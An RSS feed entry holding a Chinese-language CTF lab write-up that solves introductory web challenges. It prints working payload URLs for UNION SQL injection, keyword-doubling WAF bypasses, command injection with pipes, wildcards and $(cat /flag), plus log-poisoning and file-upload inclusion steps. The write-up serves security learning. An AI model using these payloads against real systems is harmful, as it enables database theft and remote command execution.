<?xml version="1.0" encoding="UTF-8"?><?xml-stylesheet href="/rss/feed.xsl" type="text/xsl"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>うそちゃんの博客</title><description>No description</description><link>https://huangyanqwq.github.io</link><item><title>DEF CTF</title><link>https://huangyanqwq.github.io/post/ctf/def-ctf</link><guid isPermaLink="false">ctf/def-ctf</guid><description>web-实训/入门
SQL 注入
基础 UNION
先查表 测试注入点 有回显 存在三个字段


题目提示 union 说明是联合注入类型
http://156.233.233.20:58259/?id=1 union select 1,2,3 --


先查数据库名 得到数据库名为 ctf_db</description><pubDate>Fri, 16 Jan 2026 12:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;web-实训/入门&lt;a href=&quot;#web-实训入门&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;h2&gt;SQL 注入&lt;a href=&quot;#sql-注入&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;基础 UNION&lt;a href=&quot;#基础-union&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;先查表 测试注入点 有回显 存在三个字段&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768183446847-350de962-3212-4dee-9921-29f1953f41d7.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;题目提示 union 说明是联合注入类型&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;http://156.233.233.20:58259/?id&lt;/span&gt;&lt;span&gt;=1&lt;/span&gt;&lt;span&gt; union&lt;/span&gt;&lt;span&gt; select&lt;/span&gt;&lt;span&gt; 1,2,3&lt;/span&gt;&lt;span&gt; --&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768183570913-f96b0123-5951-4c18-8ad1-5c22d2a57f3d.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;先查数据库名 得到数据库名为 ctf_db&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;http://156.233.233.20:58259/?id&lt;/span&gt;&lt;span&gt;=1&lt;/span&gt;&lt;span&gt; union&lt;/span&gt;&lt;span&gt; select&lt;/span&gt;&lt;span&gt; database&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;span&gt;,&apos;&apos;,&apos;&apos;&lt;/span&gt;&lt;span&gt; --&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768183608768-c1a0d1e0-8d2e-4cc9-8a56-6d97f6f94003.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;再从 information_schema.tables 中查表名 得到表名为 flags&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;http://156.233.233.20:58576/?id&lt;/span&gt;&lt;span&gt;=1&lt;/span&gt;&lt;span&gt; union&lt;/span&gt;&lt;span&gt; select&lt;/span&gt;&lt;span&gt; database&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;span&gt;,table_name,&apos;&apos;&lt;/span&gt;&lt;span&gt; from&lt;/span&gt;&lt;span&gt; information_schema.tables&lt;/span&gt;&lt;span&gt; where&lt;/span&gt;&lt;span&gt; table_schema=&apos;ctf_db&apos;&lt;/span&gt;&lt;span&gt; --&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768183816303-a85652a0-b6fe-4ee5-a116-bc1254ecc229.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;从 information_schema.columns 中查字段 得到字段分别为 id, flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;http://156.233.233.20:58576/?id&lt;/span&gt;&lt;span&gt;=1&lt;/span&gt;&lt;span&gt; union&lt;/span&gt;&lt;span&gt; select&lt;/span&gt;&lt;span&gt; column_name,&apos;&apos;,&apos;&apos;&lt;/span&gt;&lt;span&gt; from&lt;/span&gt;&lt;span&gt; information_schema.columns&lt;/span&gt;&lt;span&gt; where&lt;/span&gt;&lt;span&gt; table_name=&apos;flags&apos;&lt;/span&gt;&lt;span&gt; --&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768184089163-8630ad06-4296-4598-bf04-304d7b03030e.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;得到字段之后就可以直接查值了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;http://c2.def.rs:58551/?id&lt;/span&gt;&lt;span&gt;=1&lt;/span&gt;&lt;span&gt; union&lt;/span&gt;&lt;span&gt; select&lt;/span&gt;&lt;span&gt; &apos;&apos;,id,flag&lt;/span&gt;&lt;span&gt; from&lt;/span&gt;&lt;span&gt; flags&lt;/span&gt;&lt;span&gt; --&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768489595878-5007bead-deb1-4317-aca7-57b0af1a81f4.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;简易 WAF 绕过&lt;a href=&quot;#简易-waf-绕过&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;测出两列&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768491350556-bb82eec7-7920-4064-8605-439c27185434.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;经过测试 发现会把 union select 给过滤了
&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768491383205-388cce67-0b18-411c-aa5a-4519512cd3df.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;双写绕过 + 编码绕过&lt;p&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;遍历出的&lt;/span&gt;&lt;span&gt; WAF：&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;union&lt;/span&gt;&lt;span&gt; # ununionion&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt; # seselectlect&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;( &lt;/span&gt;&lt;span&gt;# %28&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;group_concat&lt;/span&gt;&lt;span&gt; # concat 替代&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;from&lt;/span&gt;&lt;span&gt; # frfrom&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;http://c2.def.rs:58101/?id&lt;/span&gt;&lt;span&gt;=1&lt;/span&gt;&lt;span&gt; ununionion&lt;/span&gt;&lt;span&gt; seselectlect&lt;/span&gt;&lt;span&gt; 1,2&lt;/span&gt;&lt;span&gt; --&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768491335588-2839999c-08e2-469e-bb8e-35a494ddd075.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;查表 得到表名 flags&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;http://c2.def.rs:58101/?id&lt;/span&gt;&lt;span&gt;=1&lt;/span&gt;&lt;span&gt; ununionion&lt;/span&gt;&lt;span&gt; seselectlect&lt;/span&gt;&lt;span&gt; 1,concat%28table_name&lt;/span&gt;&lt;span&gt;) frfromom information_schema.tables --&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768492355365-0ffdd9ba-2beb-4e50-b4ce-6902a722a351.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;查字段 得到字段 FLAG&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;http://c2.def.rs:58101/?id&lt;/span&gt;&lt;span&gt;=1&lt;/span&gt;&lt;span&gt; ununionion&lt;/span&gt;&lt;span&gt; seselectlect&lt;/span&gt;&lt;span&gt; 1,concat%28column_name&lt;/span&gt;&lt;span&gt;) frfromom information_schema.columns --&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768492481839-d4c7cc64-cdbc-4fd2-955c-03f598d76201.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768492557798-7752faab-85e0-495a-938a-71a0256a8665.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;文件包含&lt;a href=&quot;#文件包含&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;日志利用&lt;a href=&quot;#日志利用&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;?=tpl 尝试了一下发现可以包含 任意名字的文件 但是不能直接读取到日志文件&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768494498759-55659cb6-fcea-42d9-8c36-5abe3532ecc5.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;试了一下发现可以路径穿越&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768494575603-fe8130b8-ec11-495e-a305-ee430bb0f07b.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;日志文件里还会返回访问的 User-Agent&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768493808464-d2b4aaab-ddaa-47f7-936b-cf00ef9c1b1b.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;这里改用 Burpsuite 抓包 丢到 Repeater 方便调试 修改 User-Agent&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768494644489-b5446268-05ff-4631-a958-11268030acb5.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;这里改成 用 system() 函数执行系统命令 Send 之后 回去看 access.log 日志 (如果命令执行失败会在 error.log 里显示报错 不会在 access.log 里显示)&lt;p&gt;&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768494731030-cacc689a-bed2-46fa-a175-0a7d01ab65f2.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768494802829-6507da32-3de6-47b3-8c7f-b285150804e9.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;RFI 探测&lt;a href=&quot;#rfi-探测&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;PHP 配置项开启了远程文件包含和读取&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768525642045-2880ab7f-c824-429c-8b8c-2edc9fd3faaa.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;测试之后发现可以读取本地&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768525820134-2611f7c0-aa0d-41c2-974a-0ee3055948ae.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768525832331-edda9921-b412-414d-9fc9-2d572fa00e7d.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;RFI 执行&lt;a href=&quot;#rfi-执行&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768526025237-b5b6b5bd-b17c-4090-be13-a6da14fcf1d4.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;上传综合&lt;a href=&quot;#上传综合&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;经过测试 发现服务器后端对文件后缀有白名单限制 但是没有做任何内容校验&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768527490278-cbcc84be-4c4e-426c-b15e-93aea98fc066.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768527325103-68636c61-906a-47de-89cf-791b7607ce59.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;这里上传成功后 根据给的路径 查看图片 把马包含进来&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768527526812-df2a0922-2cec-4516-bdc4-07c76da64910.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768527476957-0ae680e6-6f8a-4019-969f-a3a433f175dd.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768527571136-99bc789d-1aad-4113-887f-1e64d2c3a627.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768527580418-45fe87ba-057b-472b-aabb-438169d751ac.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;文件上传&lt;a href=&quot;#文件上传&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;双后缀+包含&lt;a href=&quot;#双后缀包含&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h4&gt;
&lt;h1&gt;&lt;/h1&gt;
&lt;h1&gt;web 入门&lt;a href=&quot;#web-入门&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;h3&gt;Web26&lt;a href=&quot;#web26&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768483237495-f209c1fc-29ba-4a66-85c3-aa8ca55d7a64.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;复制给的 pass.txt&lt;/p&gt;
&lt;p&gt;在 password 处勾上 Paste 粘贴 pass.txt 的内容&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768483333007-ff3e38cf-83a8-4c3a-8f1d-b55d4f63675a.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;得到页面长度为 255 的即 Flag&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768483233481-3ca5b50f-cffa-4e42-a60d-304d3bb0fa15.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;Web28&lt;a href=&quot;#web28&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;提示尝试 /0/0 到 /100/100/ 目录&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768483528146-1b19cbf8-dcee-4831-b1dd-0f3b9772fed5.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;这里选择集束炸弹爆破攻击 payload 选择数字 从 0-100&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768483710349-7521dec8-264c-4ae9-83e4-64f8906e5cd6.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;2 - 0 同理&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768483766390-92b6aa30-753b-47de-b72c-b7bf1c47f2bb.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h1&gt;Web&lt;a href=&quot;#web&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;h2&gt;信息收集&lt;a href=&quot;#信息收集&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;Infomation&lt;a href=&quot;#infomation&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768188262655-e2e3cb4b-4595-49e8-ae6c-a22bfc8dd5fe.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;命令执行&lt;a href=&quot;#命令执行&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;h3&gt;Ping 拼接&lt;a href=&quot;#ping-拼接&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;| | | 将一个命令的输出作为另一个命令的输入。 |
| --- | --- |
| || | 用于在同一行上执行多个命令，它表示只有当前一个命令执行失败时，才会执行下一个命令。 |
| &amp;amp;&amp;amp; | 用于在同一行上执行多个命令。它表示只有当前一个命令成功执行后，才会执行下一个命令。 |&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768185602593-d2d5e844-57d8-433f-8250-23d34dfc43a0.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;http://156.233.233.20:58639/?ip&lt;/span&gt;&lt;span&gt;=127.0.0.1&lt;/span&gt;&lt;span&gt;|&lt;/span&gt;&lt;span&gt;cat&lt;/span&gt;&lt;span&gt; /flag&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768185621740-16cadcb1-1a7a-4023-8467-ba597a2cfa44.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;Ping 扩展&lt;a href=&quot;#ping-扩展&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768185711555-d838c4aa-352d-4066-8550-e56b26312db4.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;追加执行&lt;a href=&quot;#追加执行&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;什么都不输入直接查询 得到 index.php 猜测后端命令为 ls&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768185901316-8130830b-8ed5-4964-9fe2-1f885321d7bc.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;http://156.233.233.20:58596/?cmd&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;|&lt;/span&gt;&lt;span&gt;cat&lt;/span&gt;&lt;span&gt; /flag&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768185957145-ce7d7150-acdd-44e4-abb6-3495ad81a991.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;黑名单绕过&lt;a href=&quot;#黑名单绕过&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;什么都不输入直接查询 后端命令依旧是 ls 但是有过滤&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768186045654-ed054aba-eb14-42f9-9593-d2f39b0fc273.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;实测这些命令也可以读取文件内容&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768186496573-594fe705-8630-4246-bcc1-068d62386a44.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;grep&lt;/span&gt;&lt;span&gt; .&lt;/span&gt;&lt;span&gt; /flag&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;tac&lt;/span&gt;&lt;span&gt; /flag&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;sed&lt;/span&gt;&lt;span&gt; &apos;&apos;&lt;/span&gt;&lt;span&gt; /flag&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;awk&lt;/span&gt;&lt;span&gt; &apos;{print}&apos;&lt;/span&gt;&lt;span&gt; /flag&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但是 flag 被禁了 我们可以用通配符和变量绕过&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;http://156.233.233.20:58453/?file&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;|&lt;/span&gt;&lt;span&gt;nl&lt;/span&gt;&lt;span&gt; /f&lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;http://156.233.233.20:58453/?file&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;|&lt;/span&gt;&lt;span&gt;nl&lt;/span&gt;&lt;span&gt; /f?ag&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;http://156.233.233.20:58453/?file&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;|&lt;/span&gt;&lt;span&gt;nl&lt;/span&gt;&lt;span&gt; /f[^x]ag&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;http://156.233.233.20:58453/?file&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;|&lt;/span&gt;&lt;span&gt;nl&lt;/span&gt;&lt;span&gt; /f[lL][aA][gG]&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;http://156.233.233.20:58453/?file&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;;a&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;f&lt;/span&gt;&lt;span&gt;; b&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;lag&lt;/span&gt;&lt;span&gt;; &lt;/span&gt;&lt;span&gt;nl&lt;/span&gt;&lt;span&gt; /&lt;/span&gt;&lt;span&gt;$a$b&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2026/png/52637188/1768187060956-15716a0d-8d80-4bd0-8bdb-5a446f4db078.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;命令替换&lt;a href=&quot;#命令替换&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;http://156.233.233.20:58818/?text&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;$(&lt;/span&gt;&lt;span&gt;cat&lt;/span&gt;&lt;span&gt; /flag&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;
